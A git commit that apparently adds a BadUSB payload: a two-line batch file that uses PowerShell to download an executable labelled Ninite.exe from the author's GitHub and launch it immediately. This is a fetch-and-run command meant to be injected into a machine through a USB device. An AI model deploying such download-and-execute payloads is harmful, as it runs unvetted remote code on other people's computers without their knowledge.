c07b66a253e9b815489ae7d1ede0aa52e8b4e674
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2023-01-20 13:52:43 +0800

    Add files via upload

---
+++ BadUSBScripts/install/Install.bat
@@ -0,0 +1,2 @@
+cd %homepath%
+Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/install/Ninite.exe -OutFile .\Ninite.exe && start Ninite.exe
